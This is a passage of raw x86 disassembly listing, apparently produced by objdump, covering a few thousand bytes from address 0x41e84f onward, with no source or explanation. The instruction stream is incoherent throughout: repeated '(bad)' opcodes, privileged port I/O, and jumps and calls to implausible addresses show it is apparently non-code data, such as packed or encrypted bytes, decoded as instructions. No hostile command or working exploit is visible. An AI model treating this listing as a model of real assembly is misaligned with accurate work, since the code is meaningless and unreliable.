  41e84f:	pop    es
  41e850:	pop    ebx
  41e851:	loop   0x41e88d
  41e853:	push   ecx
  41e854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e855:	or     al,0xc3
  41e857:	lods   eax,DWORD PTR ds:[esi]
  41e858:	mov    DWORD PTR [eax],ebx
  41e85a:	add    ecx,DWORD PTR [edx+0x3302621e]
  41e860:	gs dec ebx
  41e862:	jae    0x41e8bf
  41e864:	xchg   ecx,eax
  41e865:	mov    al,ds:0xe5deb92f
  41e86a:	adc    DWORD PTR [eax],esi
  41e86c:	gs cmp eax,edx
  41e86f:	cli    
  41e870:	addr16 xor eax,0x453537d9
  41e876:	scas   al,BYTE PTR es:[edi]
  41e877:	mov    cl,0x3e
  41e879:	cld    
  41e87a:	or     al,0xc4
  41e87c:	out    dx,al
  41e87d:	or     DWORD PTR [ebx],eax
  41e87f:	xor    DWORD PTR [edx-0x7c313848],ecx
  41e885:	aam    0x62
  41e887:	mov    ecx,DWORD PTR [edi-0x26]
  41e88a:	outs   dx,DWORD PTR ds:[si]
  41e88c:	pop    esi
  41e88d:	dec    edx
  41e88e:	cmp    DWORD PTR [eax-0x2bf4b6b],0x31c1f954
  41e898:	cwde   
  41e899:	jnp    0x41e91a
  41e89b:	mov    bl,0xf1
  41e89d:	xor    ch,al
  41e89f:	mov    BYTE PTR [eax-0x57737a1a],al
  41e8a5:	out    dx,al
  41e8a6:	(bad)  
  41e8a7:	popf   
  41e8a8:	adc    al,0x8e
  41e8aa:	or     al,0x43
  41e8ac:	popf   
  41e8ad:	pop    es
  41e8ae:	fnstcw WORD PTR [edx+0x5a6452e3]
  41e8b4:	call   0x1fd2ee1c
  41e8b9:	push   edx
  41e8ba:	xor    DWORD PTR ds:0xe7b8f35e,0x6d
  41e8c1:	mov    esp,ds
  41e8c3:	aaa    
  41e8c4:	test   DWORD PTR [edi+0x63093445],edx
  41e8ca:	mov    bh,0xf3
  41e8cc:	cld    
  41e8cd:	cdq    
  41e8ce:	sbb    edi,DWORD PTR [edx+0x541b8f39]
  41e8d4:	mov    BYTE PTR [ebx-0x609e5847],cl
  41e8da:	jecxz  0x41e8e0
  41e8dc:	and    BYTE PTR [edx+0x6b],ch
  41e8df:	jnp    0x41e95c
  41e8e1:	imul   esp,DWORD PTR [edi],0xc856b90b
  41e8e7:	mov    dl,0xe
  41e8e9:	or     al,0x0
  41e8eb:	out    0xf9,al
  41e8ed:	pop    es
  41e8ee:	out    dx,eax
  41e8ef:	dec    ecx
  41e8f0:	fwait
  41e8f1:	sbb    eax,0x490bf6d0
  41e8f6:	lods   eax,DWORD PTR ds:[esi]
  41e8f7:	mov    eax,0x4a06c069
  41e8fc:	add    dl,BYTE PTR [ecx]
  41e8fe:	dec    edx
  41e8ff:	inc    esi
  41e900:	in     eax,dx
  41e901:	retf   
  41e902:	inc    esi
  41e903:	add    ebp,DWORD PTR [eax]
  41e905:	shl    DWORD PTR [edx+ebx*1+0x34],0x6b
  41e90a:	(bad)  
  41e90b:	(bad)  
  41e90c:	mov    edx,0x74b920e3
  41e911:	mov    bl,0x98
  41e913:	out    dx,eax
  41e914:	and    BYTE PTR [ecx],dl
  41e916:	test   eax,0x6204650f
  41e91b:	inc    ebp
  41e91c:	add    BYTE PTR [eax-0x5cd5e4aa],bh
  41e922:	and    eax,0x985887b5
  41e927:	in     al,0x68
  41e929:	cmp    al,0x4
  41e92b:	stos   BYTE PTR es:[edi],al
  41e92c:	cmp    BYTE PTR [eax+0x6f],bl
  41e92f:	jp     0x41e8d3
  41e931:	cdq    
  41e932:	pop    cx
  41e934:	sbb    eax,0xc2637bdc
  41e939:	mov    esp,0xffb69861
  41e93e:	arpl   ax,di
  41e940:	mov    ebp,0x364db6af
  41e945:	scas   eax,DWORD PTR es:[edi]
  41e946:	fwait
  41e947:	repnz out dx,eax
  41e949:	jl     0x41e91a
  41e94b:	mov    eax,DWORD PTR [edx+edx*1+0x2c]
  41e94f:	call   edi
  41e951:	lds    ecx,FWORD PTR [edi-0x5b]
  41e954:	loopne 0x41e928
  41e956:	cmc    
  41e957:	fsubr  QWORD PTR [ecx-0x4e]
  41e95a:	xchg   edi,eax
  41e95b:	test   al,0x5b
  41e95d:	push   edi
  41e95e:	sbb    al,0xe1
  41e960:	arpl   WORD PTR [edi-0x11d2f74d],cx
  41e966:	xchg   BYTE PTR [ecx],dl
  41e968:	aaa    
  41e969:	sub    al,0xdb
  41e96b:	out    dx,eax
  41e96c:	dec    edx
  41e96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e96e:	mov    ah,0xc4
  41e970:	gs or  al,0xea
  41e973:	cmp    DWORD PTR [esi+0x3c],esi
  41e976:	cli    
  41e977:	lods   eax,DWORD PTR ds:[esi]
  41e978:	(bad)  
  41e979:	jp     0x41e9b3
  41e97b:	or     ebx,ecx
  41e97d:	pop    edx
  41e97e:	sub    DWORD PTR [ebx],ecx
  41e980:	fiadd  DWORD PTR [edi+0x76]
  41e983:	mul    BYTE PTR [eax]
  41e985:	ret    
  41e986:	inc    ebp
  41e987:	xor    ecx,edi
  41e989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e98a:	sub    ecx,DWORD PTR [esi]
  41e98c:	push   es
  41e98d:	(bad)  
  41e98e:	fstp   QWORD PTR [edi-0x763dae7a]
  41e994:	hlt    
  41e995:	jo     0x41e938
  41e997:	push   0xffffffad
  41e999:	call   0x12caf618
  41e99e:	push   ebp
  41e99f:	test   BYTE PTR [eax],dh
  41e9a1:	lea    esp,[edx+0x9]
  41e9a4:	push   cs
  41e9a5:	retf   0xe3b1
  41e9a8:	dec    eax
  41e9a9:	rol    BYTE PTR [eax+0x22],cl
  41e9ac:	dec    eax
  41e9ad:	ficomp DWORD PTR [eax-0x19]
  41e9b0:	aad    0x64
  41e9b2:	jne    0x41ea1f
  41e9b4:	(bad)  
  41e9b5:	sub    al,0x76
  41e9b7:	int3   
  41e9b8:	aas    
  41e9b9:	adc    edi,DWORD PTR [ecx]
  41e9bb:	ja     0x41e9fe
  41e9bd:	aad    0xe2
  41e9bf:	xor    ch,dl
  41e9c1:	pushf  
  41e9c2:	hlt    
  41e9c3:	or     DWORD PTR [esi+eax*2+0x18c8b1f8],0x2337ae51
  41e9ce:	lods   al,BYTE PTR ds:[esi]
  41e9cf:	mov    edi,0x6bac92a1
  41e9d4:	call   0x8823b6a5
  41e9d9:	adc    eax,0xc48636ec
  41e9de:	xchg   ecx,eax
  41e9df:	in     eax,0x9a
  41e9e1:	mov    edi,0x50d5e3f
  41e9e6:	adc    BYTE PTR [esi+0x7906229d],dl
  41e9ec:	(bad)  [ebx-0x5f5b3f9a]
  41e9f2:	out    0x52,al
  41e9f4:	mov    dl,0xd2
  41e9f6:	out    dx,al
  41e9f7:	add    BYTE PTR [edx-0x669b87a3],bl
  41e9fd:	xor    eax,0xcf9b495c
  41ea02:	adc    eax,0xfa6646f4
  41ea07:	in     al,dx
  41ea08:	pop    ebp
  41ea09:	mov    esi,0x3e2a35d2
  41ea0e:	sub    esp,DWORD PTR [edi]
  41ea10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea11:	shl    ecx,1
  41ea13:	js     0x41ea94
  41ea15:	push   eax
  41ea16:	xor    eax,0x3b5b9c88
  41ea1b:	inc    eax
  41ea1c:	gs jp  0x41e9b8
  41ea1f:	dec    ecx
  41ea20:	sbb    eax,0x31613dac
  41ea26:	ins    BYTE PTR es:[edi],dx
  41ea27:	add    dl,BYTE PTR [edi-0xe]
  41ea2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea2b:	nop
  41ea2c:	fnsave [ebx+0x7b]
  41ea2f:	push   ecx
  41ea30:	xchg   esi,eax
  41ea31:	push   cs
  41ea32:	mov    dl,0xe2
  41ea34:	shl    DWORD PTR [esi],cl
  41ea36:	fst    QWORD PTR [eax+0x5]
  41ea39:	data16 test al,0x17
  41ea3c:	nop
  41ea3d:	rcl    DWORD PTR ds:0xaf5365b7,0x9b
  41ea44:	add    al,0xed
  41ea46:	mov    edx,0xb3aff612
  41ea4b:	(bad)  
  41ea4c:	fst    st(6)
  41ea4e:	test   al,0xab
  41ea50:	xor    ebp,DWORD PTR [ebx+0x78a0a775]
  41ea56:	sub    eax,0x4c916c56
  41ea5b:	mov    ecx,0x932e5149
  41ea60:	xor    al,0xeb
  41ea62:	sbb    DWORD PTR [ebp+esi*2+0x7b1f635c],edi
  41ea69:	scas   al,BYTE PTR es:[edi]
  41ea6a:	imul   ebp,esi,0xded05ab3
  41ea70:	pusha  
  41ea71:	xchg   ebp,eax
  41ea72:	pop    es
  41ea73:	rcl    ebp,0x14
  41ea76:	data16 jg 0x41ead2
  41ea79:	sub    BYTE PTR [ebx+0x17cca60e],ah
  41ea7f:	push   ecx
  41ea80:	inc    ecx
  41ea81:	and    dl,BYTE PTR [ebx]
  41ea83:	sar    DWORD PTR es:[edx-0x33],0x86
  41ea88:	sbb    DWORD PTR [edx-0x348944e7],edi
  41ea8e:	test   eax,0xab029857
  41ea93:	push   esp
  41ea94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea95:	(bad)  
  41ea96:	hlt    
  41ea97:	popa   
  41ea98:	enter  0xcfb4,0x3a
  41ea9c:	adc    BYTE PTR [esi+ebx*1+0x58],al
  41eaa0:	push   eax
  41eaa1:	mov    esi,0x21ced2cb
  41eaa6:	dec    ebp
  41eaa7:	out    0x39,al
  41eaa9:	data16 jbe 0x41eab4
  41eaac:	addr16 call 0xccf3e414
  41eab2:	daa    
  41eab3:	cmp    ebx,eax
  41eab5:	dec    eax
  41eab6:	mov    cl,0x8a
  41eab8:	fdiv   QWORD PTR [ebp+0x9]
  41eabb:	jmp    0x6b2e51b5
  41eac0:	mov    es,WORD PTR [edi-0x28]
  41eac3:	cmp    BYTE PTR ds:0x4ee0567d,bl
  41eac9:	lods   al,BYTE PTR ds:[esi]
  41eaca:	pop    ebp
  41eacb:	pop    eax
  41eacc:	(bad)  
  41eace:	inc    edi
  41eacf:	adc    ah,cl
  41ead1:	pushf  
  41ead2:	in     al,dx
  41ead3:	in     eax,0xf6
  41ead5:	and    eax,0xf35228dc
  41eada:	out    0xd7,eax
  41eadc:	or     BYTE PTR [esi-0x1d2177cc],0x7e
  41eae3:	stc    
  41eae4:	lock mov ds:0xd254b717,eax
  41eaea:	pop    es
  41eaeb:	cdq    
  41eaec:	daa    
  41eaed:	fs sbb eax,0x34396286
  41eaf3:	pushf  
  41eaf4:	call   0x90c6:0x27dfeb2a
  41eafb:	daa    
  41eafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eafd:	sbb    eax,0xf3186a9f
  41eb02:	retf   0xdb2b
  41eb05:	or     DWORD PTR [ebx-0x7],edi
  41eb08:	xchg   ebp,eax
  41eb09:	sbb    eax,0xed498bd6
  41eb0e:	mov    dl,0xef
  41eb10:	or     ah,al
  41eb12:	xchg   edi,eax
  41eb13:	inc    ebx
  41eb14:	sub    al,0x77
  41eb17:	dec    edx
  41eb18:	loop   0x41eb95
  41eb1a:	retf   0xf9e7
  41eb1d:	das    
  41eb1e:	popf   
  41eb1f:	adc    al,0x96
  41eb21:	add    ch,ch
  41eb23:	push   ss
  41eb24:	jno    0x41eb8a
  41eb26:	mov    ecx,es
  41eb28:	and    DWORD PTR [ecx],0x57d53fd5
  41eb2e:	mov    ds:0xb12f7a10,eax
  41eb33:	ja     0x41eb52
  41eb35:	gs daa 
  41eb37:	mov    eax,0x14ec30fa
  41eb3c:	xor    DWORD PTR [ebx+0x4ae855e],eax
  41eb42:	mov    esi,0xe30495d8
  41eb47:	lock pminsw mm7,mm5
  41eb4b:	add    esi,DWORD PTR [edi+eiz*1+0x36073a8c]
  41eb52:	aas    
  41eb53:	push   eax
  41eb54:	xor    bh,BYTE PTR [eax+ecx*4-0x4b382f68]
  41eb5b:	jle    0x41eb2a
  41eb5d:	xor    ebp,DWORD PTR [esi-0x15]
  41eb60:	dec    BYTE PTR [ecx]
  41eb62:	call   0xf8fea9cc
  41eb67:	ja     0x41eb1f
  41eb69:	jbe    0x41eb2a
  41eb6b:	mov    eax,0x43895faa
  41eb70:	xor    al,0xdb
  41eb72:	shl    esp,cl
  41eb74:	xchg   DWORD PTR [ebx-0x4d],ecx
  41eb77:	xchg   BYTE PTR [eax+edx*2+0xd16869f],bl
  41eb7e:	iret   
  41eb7f:	mov    dl,0xe7
  41eb81:	ret    
  41eb82:	cmp    eax,0x7d552a31
  41eb87:	leave  
  41eb88:	clc    
  41eb89:	dec    ebp
  41eb8a:	or     cl,bh
  41eb8c:	fiadd  WORD PTR [esi]
  41eb8e:	js     0x41ebbf
  41eb90:	rcr    DWORD PTR [eax+0x39bce968],0xfe
  41eb97:	mov    ecx,0x572697ab
  41eb9c:	icebp  
  41eb9d:	mov    esi,0x97779a10
  41eba2:	rcr    bh,0x33
  41eba5:	je     0x41eb78
  41eba7:	cli    
  41eba8:	js     0x41ec04
  41ebaa:	aad    0xba
  41ebac:	fsubr  QWORD PTR [edx-0x60]
  41ebaf:	shl    BYTE PTR [ecx-0x27],0x82
  41ebb3:	xchg   ebx,eax
  41ebb4:	sbb    DWORD PTR [edx+0x219de18f],0x4b
  41ebbb:	xor    edx,DWORD PTR [ebp+0x41]
  41ebbe:	scas   eax,DWORD PTR es:[edi]
  41ebbf:	inc    ebx
  41ebc0:	xlat   BYTE PTR ds:[ebx]
  41ebc1:	pop    edx
  41ebc2:	push   0x8371cee4
  41ebc7:	cmp    BYTE PTR [esi+0x3c],ah
  41ebca:	mov    cl,0xa0
  41ebcc:	add    al,0x24
  41ebce:	jecxz  0x41ebc7
  41ebd0:	xor    dh,BYTE PTR [edi]
  41ebd2:	hlt    
  41ebd3:	sub    bl,BYTE PTR [eax]
  41ebd5:	jmp    0x41ebd3
  41ebd7:	aas    
  41ebd8:	sub    bh,BYTE PTR [edx-0x14dc12d]
  41ebde:	dec    edx
  41ebdf:	sub    ebx,DWORD PTR [edx+0x211d6705]
  41ebe5:	jns    0x41ebf4
  41ebe7:	mov    eax,?
  41ebe9:	pop    ss
  41ebea:	xchg   ecx,eax
  41ebeb:	xchg   ebp,eax
  41ebec:	pop    ebp
  41ebed:	adc    ch,cl
  41ebef:	and    eax,0x889be270
  41ebf4:	daa    
  41ebf5:	cs jmp 0x6df:0xafba677d
  41ebfd:	ret    
  41ebfe:	sub    BYTE PTR [ebp-0x42],al
  41ec01:	bound  esi,QWORD PTR [edx]
  41ec03:	and    ah,BYTE PTR [eax+0x1c56b070]
  41ec09:	or     DWORD PTR [ebp-0x2d5c5010],esp
  41ec0f:	mov    bl,0x4e
  41ec11:	jge    0x41ebce
  41ec13:	mov    bh,0x8a
  41ec15:	mov    ah,0x5b
  41ec17:	das    
  41ec18:	xor    al,BYTE PTR [eax-0x7f10ea67]
  41ec1e:	stos   BYTE PTR es:[edi],al
  41ec1f:	(bad)  
  41ec20:	aad    0xb8
  41ec22:	loope  0x41ec92
  41ec24:	stos   BYTE PTR es:[edi],al
  41ec25:	fisttp DWORD PTR [ecx-0x31]
  41ec28:	test   DWORD PTR [edx+0x6b],edi
  41ec2b:	stc    
  41ec2c:	or     eax,0x4196fac
  41ec31:	jge    0x41ebbd
  41ec33:	dec    edx
  41ec34:	inc    edi
  41ec35:	ja     0x41ec31
  41ec37:	pusha  
  41ec38:	jo     0x41ec0f
  41ec3a:	gs jle 0x41ec59
  41ec3d:	mov    dl,0x5e
  41ec3f:	xchg   edi,eax
  41ec40:	dec    esp
  41ec41:	(bad)  
  41ec42:	es and dl,ah
  41ec45:	xor    esi,DWORD PTR [esi+eax*2]
  41ec48:	call   0x8e87:0xb3bde536
  41ec4f:	out    0xaf,al
  41ec51:	mov    DWORD PTR [ebp+0x1d],edx
  41ec54:	and    DWORD PTR [edx-0x49a68d31],0xffffff9b
  41ec5b:	(bad)  
  41ec5c:	bound  ebx,QWORD PTR [ebx+0x69]
  41ec5f:	ds jmp 0xe141:0x9f16875d
  41ec67:	rol    BYTE PTR [esi-0x74],cl
  41ec6a:	and    al,0xd
  41ec6c:	mov    WORD PTR [eax-0x1c],ds
  41ec6f:	push   ss
  41ec70:	sub    DWORD PTR [edx+esi*8-0xed87867],eax
  41ec77:	add    eax,0x8e452419
  41ec7c:	push   esp
  41ec7d:	xchg   edi,eax
  41ec7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec7f:	jns    0x41ec52
  41ec81:	jmp    0x41eccf
  41ec83:	adc    al,0x61
  41ec85:	test   al,0xcf
  41ec87:	inc    esp
  41ec88:	push   ds
  41ec89:	pop    ebp
  41ec8a:	pop    es
  41ec8b:	dec    edi
  41ec8c:	push   ds
  41ec8d:	pop    esi
  41ec8e:	in     eax,0xb2
  41ec90:	push   0xffffffb8
  41ec92:	jl     0x41ec48
  41ec94:	repz xor dl,BYTE PTR [esi+edi*2]
  41ec98:	push   es
  41ec99:	int    0x15
  41ec9b:	sbb    DWORD PTR [eax],0x8253451c
  41eca1:	pop    ss
  41eca2:	lods   eax,DWORD PTR ds:[esi]
  41eca3:	xlat   BYTE PTR ds:[ebx]
  41eca4:	lods   eax,DWORD PTR ds:[esi]
  41eca5:	push   ds
  41eca6:	add    eax,0xdb8c71a3
  41ecab:	aad    0xe3
  41ecad:	lods   eax,DWORD PTR ds:[esi]
  41ecae:	and    DWORD PTR [edi],edi
  41ecb0:	pusha  
  41ecb1:	hlt    
  41ecb2:	out    0xc8,al
  41ecb4:	or     DWORD PTR [esi-0x3ff6410],0xffffff95
  41ecbb:	push   esi
  41ecbc:	clc    
  41ecbd:	scas   eax,DWORD PTR es:[edi]
  41ecbe:	jecxz  0x41ec80
  41ecc0:	sub    esi,ebp
  41ecc2:	dec    eax
  41ecc3:	sbb    esi,ecx
  41ecc5:	jnp    0x41ec81
  41ecc7:	scas   al,BYTE PTR es:[edi]
  41ecc8:	push   esi
  41ecc9:	ds nop
  41eccb:	cs inc edi
  41eccd:	scas   eax,DWORD PTR es:[edi]
  41ecce:	dec    esi
  41eccf:	(bad)  
  41ecd0:	aad    0x76
  41ecd2:	cmp    DWORD PTR [eax],0xffffffb7
  41ecd5:	jmp    0x41ec92
  41ecd7:	imul   ebp,DWORD PTR [ebp-0x49],0x2ceb3fb2
  41ecde:	retf   0xfd30
  41ece1:	push   edx
  41ece2:	je     0x41ec74
  41ece4:	adc    BYTE PTR [esi-0x2d68d88f],dl
  41ecea:	aaa    
  41eceb:	or     DWORD PTR [ebp+ebp*4-0x36],ebp
  41ecef:	push   esp
  41ecf0:	loop   0x41ed4e
  41ecf2:	test   BYTE PTR [ebp+ebp*1-0x70],ah
  41ecf6:	repnz mov bl,0x91
  41ecf9:	fldcw  WORD PTR [ecx-0x38e05e46]
  41ecff:	jle    0x41ed0a
  41ed01:	dec    esp
  41ed02:	add    al,0x0
  41ed04:	xchg   edi,eax
  41ed05:	cmp    al,0x55
  41ed07:	jbe    0x41ed1d
  41ed09:	xchg   ebp,eax
  41ed0a:	test   al,0xb0
  41ed0c:	jno    0x41ed4e
  41ed0e:	adc    eax,0xeb9d6e26
  41ed13:	sub    al,0x86
  41ed15:	xlat   BYTE PTR ds:[ebx]
  41ed16:	adc    DWORD PTR [esi],esp
  41ed18:	mov    ds,WORD PTR [eax-0x4e]
  41ed1b:	or     eax,0x62797c8f
  41ed20:	mov    ch,0x46
  41ed22:	popf   
  41ed23:	inc    BYTE PTR ds:0x4d180653
  41ed29:	mov    bl,BYTE PTR [ebx+ecx*2+0x1d462960]
  41ed30:	loop   0x41ed2b
  41ed32:	test   eax,0x1ce409a4
  41ed37:	hlt    
  41ed38:	out    0xaf,eax
  41ed3a:	mov    ebp,0xbbdb68ae
  41ed3f:	(bad)  
  41ed40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed41:	dec    ecx
  41ed42:	push   ecx
  41ed43:	jb     0x41ed06
  41ed45:	mov    edx,DWORD PTR [ebx]
  41ed47:	mov    eax,0xddc5a65a
  41ed4c:	into   
  41ed4d:	or     ebx,DWORD PTR [eax+eax*8+0x5e78a2c8]
  41ed54:	ror    DWORD PTR [edi+0x25d2083e],0x39
  41ed5b:	adc    eax,0x2e9868b
  41ed60:	sub    bh,BYTE PTR [esi]
  41ed62:	push   ss
  41ed63:	pusha  
  41ed64:	test   DWORD PTR [edx-0x6d],0xb52c5da3
  41ed6b:	add    edi,DWORD PTR [ecx]
  41ed6d:	retf   
  41ed6e:	lods   al,BYTE PTR ds:[esi]
  41ed6f:	ss cwde 
  41ed71:	sbb    esi,DWORD PTR fs:[ebx+edx*4]
  41ed75:	fwait
  41ed76:	scas   al,BYTE PTR es:[edi]
  41ed77:	lods   eax,DWORD PTR ds:[esi]
  41ed78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed79:	clc    
  41ed7a:	daa    
  41ed7b:	add    DWORD PTR ds:0x167985d9,ebx
  41ed81:	add    BYTE PTR [eax],ah
  41ed83:	in     eax,0xe0
  41ed85:	imul   esi,DWORD PTR [eax+edi*1-0x4a],0xfffffffd
  41ed8a:	pop    ebp
  41ed8b:	(bad)  
  41ed8c:	(bad)  [ebx]
  41ed8e:	std    
  41ed8f:	int    0x81
  41ed91:	xchg   edx,eax
  41ed92:	jb     0x41ed41
  41ed94:	je     0x7144f574
  41ed9a:	in     al,0xd6
  41ed9c:	test   dl,al
  41ed9e:	test   al,0x88
  41eda0:	addr16 inc ecx
  41eda2:	ret    0xe4d8
  41eda5:	ss pusha 
  41eda7:	aas    
  41eda8:	int3   
  41eda9:	adc    dh,al
  41edab:	loop   0x41ed3b
  41edad:	iretw  
  41edaf:	dec    esi
  41edb0:	adc    cl,BYTE PTR [edi]
  41edb2:	jg     0x41ed87
  41edb4:	and    BYTE PTR [edi],dl
  41edb6:	scas   al,BYTE PTR es:[edi]
  41edb7:	jne    0x41ede0
  41edb9:	clc    
  41edba:	enter  0xc98c,0x65
  41edbe:	mov    bl,0x7d
  41edc0:	ret    0xf535
  41edc3:	inc    ebx
  41edc4:	test   BYTE PTR [edi-0x10],ah
  41edc7:	xor    BYTE PTR [esi+edx*8+0x1d1383e6],0x6d
  41edcf:	push   ss
  41edd0:	pop    es
  41edd1:	cli    
  41edd2:	jbe    0x41ee2f
  41edd4:	pop    ebx
  41edd5:	jmp    0x4b399c0e
  41edda:	push   ebx
  41eddb:	mov    al,ds:0x4557512e
  41ede0:	sbb    eax,0xc159b910
  41ede5:	jp     0x41ee15
  41ede7:	mov    bh,0x6c
  41ede9:	mov    ebx,0x35168e5d
  41edee:	add    BYTE PTR [ecx-0x30e316f2],0x92
  41edf5:	scas   al,BYTE PTR es:[edi]
  41edf6:	jns    0x41ee44
  41edf8:	gs mov ebp,0x4c2cad35
  41edfe:	cld    
  41edff:	push   ebp
  41ee00:	mov    ds,WORD PTR [esi-0xdf893fc]
  41ee06:	loopne 0x41ede7
  41ee08:	add    esp,edx
  41ee0a:	clc    
  41ee0b:	cdq    
  41ee0c:	dec    esi
  41ee0d:	push   esp
  41ee0e:	dec    ecx
  41ee0f:	lahf   
  41ee10:	mov    ah,BYTE PTR [eax-0x17543946]
  41ee16:	ins    DWORD PTR es:[edi],dx
  41ee17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee18:	sub    ah,BYTE PTR [edi+0x49]
  41ee1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee1c:	and    bl,0x5d
  41ee1f:	jne    0x41edd7
  41ee21:	mov    BYTE PTR [edi+0x3f4417c5],0x66
  41ee28:	ret    0x72c1
  41ee2b:	mov    dh,0xfd
  41ee2d:	mov    esp,esi
  41ee2f:	lods   eax,DWORD PTR ds:[esi]
  41ee30:	mov    edx,0x96af714
  41ee35:	dec    edi
  41ee36:	dec    ebx
  41ee37:	sub    edi,DWORD PTR [ecx*8-0x48bdf627]
  41ee3e:	mov    al,ds:0x2c4c6bb0
  41ee43:	stc    
  41ee44:	fisttp WORD PTR [eax-0x2f]
  41ee47:	push   ecx
  41ee48:	imul   eax,DWORD PTR [ebx],0x2c
  41ee4b:	(bad)  
  41ee4c:	(bad)  
  41ee4d:	ret    0x1bc2
  41ee50:	xlat   BYTE PTR ds:[ebx]
  41ee51:	fmul   DWORD PTR [edx]
  41ee53:	or     BYTE PTR [eax-0xb],cl
  41ee56:	retf   
  41ee57:	loope  0x41ee24
  41ee59:	pop    es
  41ee5a:	out    0x83,eax
  41ee5c:	or     esi,esp
  41ee5e:	shl    edi,0xd3
  41ee61:	ds ja  0x41ee64
  41ee64:	ins    DWORD PTR es:[edi],dx
  41ee65:	sbb    bl,BYTE PTR [edi-0x69]
  41ee68:	cmp    eax,0xede4c271
  41ee6d:	jge    0x41ee40
  41ee6f:	imul   BYTE PTR [edi]
  41ee71:	add    BYTE PTR [ecx+ebx*8],dh
  41ee74:	fs dec ebx
  41ee76:	sti    
  41ee77:	jp     0x41ee43
  41ee79:	jg     0x41ee98
  41ee7b:	cwde   
  41ee7c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee7e:	or     BYTE PTR [ebp-0xb],bl
  41ee81:	cwde   
  41ee82:	pop    ss
  41ee83:	fwait
  41ee84:	(bad)  
  41ee85:	imul   esp,DWORD PTR [ecx],0xb90f4e93
  41ee8b:	sub    DWORD PTR [edi],esi
  41ee8d:	lods   eax,DWORD PTR ds:[esi]
  41ee8e:	(bad)  
  41ee8f:	(bad)  
  41ee90:	sar    BYTE PTR [ebx],cl
  41ee92:	xchg   ebx,eax
  41ee93:	outs   dx,DWORD PTR ds:[esi]
  41ee94:	pop    es
  41ee95:	push   0x257d72b8
  41ee9a:	jp     0x41ee81
  41ee9c:	jmp    0xc473f3d9
  41eea1:	ins    DWORD PTR es:[edi],dx
  41eea2:	imul   ebp,DWORD PTR [edi-0x46],0xffffffee
  41eea6:	adc    BYTE PTR [ebx],dl
  41eea8:	aaa    
  41eea9:	pop    ebx
  41eeaa:	aad    0x49
  41eeac:	sti    
  41eead:	aad    0x9a
  41eeaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeb0:	or     bh,cl
  41eeb2:	inc    ecx
  41eeb3:	iret   
  41eeb4:	inc    ecx
  41eeb5:	not    DWORD PTR [eax-0x75]
  41eeb8:	jns    0x41ee3e
  41eeba:	ret    0xe7b4
  41eebd:	ficom  DWORD PTR [edi-0xb2589bf]
  41eec3:	sub    dl,cl
  41eec5:	scas   eax,DWORD PTR es:[edi]
  41eec6:	add    ch,BYTE PTR [ebp+edx*2+0x66]
  41eeca:	es aad 0x7e
  41eecd:	sbb    BYTE PTR [ebp+0x72],cl
  41eed0:	inc    eax
  41eed1:	push   edx
  41eed2:	ret    
  41eed3:	xchg   edi,eax
  41eed4:	jp     0x41eec8
  41eed6:	cs jne 0x41eea7
  41eed9:	in     eax,dx
  41eeda:	cdq    
  41eedb:	pop    ds
  41eedc:	arpl   WORD PTR [edi+0x57ba86ff],si
  41eee2:	cld    
  41eee3:	mov    BYTE PTR [ebp+0x20],0xf1
  41eee7:	mov    BYTE PTR [esi-0x1e],dl
  41eeea:	or     BYTE PTR [ebx+0x727f4b22],ch
  41eef0:	add    edx,DWORD PTR [ebx]
  41eef2:	cmc    
  41eef3:	xchg   edi,eax
  41eef4:	mov    edx,0xebe661c9
  41eef9:	mov    edx,0x5a6d0e41
  41eefe:	dec    ebx
  41eeff:	fisttp QWORD PTR [edx+0x65]
  41ef02:	jge    0x41ef67
  41ef04:	mov    fs,WORD PTR [ebx]
  41ef06:	mov    DWORD PTR ds:0xc6436fb8,ecx
  41ef0c:	mov    bh,BYTE PTR [edx-0x7b]
  41ef0f:	push   eax
  41ef10:	adc    BYTE PTR [edi+0x3d],ch
  41ef13:	cmp    ebp,ebp
  41ef15:	jno    0x41eefa
  41ef17:	dec    eax
  41ef18:	mov    cl,0x8e
  41ef1a:	add    ecx,0xffffffe6
  41ef1d:	mov    gs,ecx
  41ef1f:	imul   edx,DWORD PTR [ecx+0x6d7966c1],0xffffff9e
  41ef26:	fidiv  DWORD PTR ds:0x4205134
  41ef2c:	cmp    BYTE PTR [eax+0x542a9745],bl
  41ef32:	push   cs
  41ef33:	mov    ebp,esp
  41ef35:	out    0x6e,al
  41ef37:	iret   
  41ef38:	sub    DWORD PTR [ebp-0x4d],esi
  41ef3b:	jmp    0x2b9d34db
  41ef40:	jns    0x41ef86
  41ef42:	popf   
  41ef43:	mov    ah,0x46
  41ef45:	dec    ebx
  41ef46:	mov    bl,0xd3
  41ef48:	popa   
  41ef49:	stos   DWORD PTR es:[edi],eax
  41ef4a:	pop    es
  41ef4b:	cmp    eax,esi
  41ef4d:	add    al,0x4
  41ef4f:	xchg   DWORD PTR [edx-0x7940a571],edi
  41ef55:	arpl   WORD PTR [ebp+ebp*8-0x12d1d823],dx
  41ef5c:	xlat   BYTE PTR ds:[ebx]
  41ef5d:	lea    esi,[ecx-0x7fb5c9d2]
  41ef63:	shl    eax,1
  41ef65:	ins    BYTE PTR es:[edi],dx
  41ef66:	mov    eax,0x9552bef1
  41ef6b:	jb     0x41ef8b
  41ef6d:	pop    edx
  41ef6e:	jbe    0x41ef46
  41ef70:	cmp    eax,0xfbfa6692
  41ef75:	dec    edi
  41ef76:	jmp    0x3b2eba37
  41ef7b:	(bad)  
  41ef7c:	pop    ebp
  41ef7d:	mov    al,0x25
  41ef7f:	sub    al,0x98
  41ef81:	pop    ebx
  41ef82:	jo     0x41ef8f
  41ef84:	jo     0x41ef95
  41ef86:	aas    
  41ef87:	cld    
  41ef88:	aad    0x1f
  41ef8a:	pop    edx
  41ef8b:	xchg   ebp,eax
